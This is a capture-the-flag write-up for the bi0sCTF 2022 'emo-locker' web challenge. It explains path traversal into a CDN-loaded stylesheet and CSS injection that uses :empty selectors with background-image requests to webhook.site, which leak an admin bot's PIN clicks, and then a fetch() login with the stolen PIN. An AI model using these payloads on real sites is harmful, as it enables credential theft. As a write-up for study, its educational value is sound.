# bi0sCTF-2022-emo-locker

The first thing we identify is that the app is taking a value from the URL without filtering it and use it to load CSS code.
![image](https://user-images.githubusercontent.com/14858959/214001671-b508e6a2-23e2-4f8f-9df0-80f4bf4cf5da.png)

We can exploit this by inserting on the URL our custom hash, pointing to our malicious code:
```
https://cdn.jsdelivr.net/npm/darkmode-css@1.0.1/xxxxxxx-mode.css
```
By visiting `http://web.chall.bi0s.in:10101/#../../gh/GramThanos/github_repo_here@github_commit_here/malicious.css?` the CSS that the page will load will be:
```
https://cdn.jsdelivr.net/npm/darkmode-css@1.0.1/../../gh/GramThanos/github_repo_here@github_commit_here/malicious.css?-mode.css
```

Since the code is in CSS, we will have to detect the user actions (click) using CSS. This is done by creating a request on each action and monitoring the requests. Normaly to do that you add background image requests on actions such as "hover", "focus", "active", but here since the client is a bot, such mouse events where not working.

First we added an instant request to verify that our code was working:
```css
body {background-image: url('https://webhook.site/8566bcb8-ed2f-468c-8ad3-d587c2494428?i=loaded');}
```
![image](https://user-images.githubusercontent.com/14858959/214003245-2a86c85d-6a05-4b9e-b322-7a379ca1ebf4.png)

Then my observing the page we identified that on each click, the emoji was removed, leaving the button empty from content... thus after some searching we identified the `:empty` css selector that could be used to fire our events.
For for emoji with id 1 we had the CSS code:
```css
span[role=img][aria-label="1"]:empty {background: url('https://webhook.site/8566bcb8-ed2f-468c-8ad3-d587c2494428?i=1');}
```

We send the link `http://web.chall.bi0s.in:10101/#../../gh/GramThanos/bi0sCTF-2022-emo-locker@53e70828379f3826a4213dd952307526b4a4707a/malicious.css?` to the bot. And we got the click events:
![image](https://user-images.githubusercontent.com/14858959/214003788-0a64022e-8195-4d0f-9edb-a745e7eea470.png)
By instecting the events from the first to the last one we tritrieved the admin password:
```
[51, 32, 73, 34, 85, 126, 17, 158, 79, 50]
``` 

We make to request to login:
```javascript
fetch("http://web.chall.bi0s.in:10101/api/login", {
  "headers": {
    "accept": "*/*",
    "accept-language": "en-US,en;q=0.9,el;q=0.8",
    "cache-control": "no-cache",
    "content-type": "application/json",
    "pragma": "no-cache"
  },
  "referrer": "http://web.chall.bi0s.in:10101/?",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": "{\"username\":\"admin\",\"pin\":[51, 32, 73, 34, 85, 126, 17, 158, 79, 50]}",
  "method": "POST",
  "mode": "cors",
  "credentials": "omit"
});
```
![image](https://user-images.githubusercontent.com/14858959/214001505-7888f7ef-10a7-4b46-9e3a-a8d7842a884d.png)


The flag is returned as a cookie:
![image](https://user-images.githubusercontent.com/14858959/214001253-0ba31965-9e3d-4bda-9ed4-f1a4083ccb0c.png)
